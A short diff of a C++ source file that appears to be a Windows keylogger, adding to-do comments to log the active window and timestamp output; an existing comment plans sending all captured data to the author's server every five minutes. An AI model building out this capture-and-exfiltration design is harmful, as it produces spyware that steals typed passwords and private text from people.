@@ -4,6 +4,8 @@
 
 // Future features	
 // Make it send all the information to a server I set up, possibly every 5 minutes or so
+// Make it show the current window
+// Include date and time stamp with all output flushes
 
 #include <fstream> // Write to file
 #include <windows.h> // Get key presses
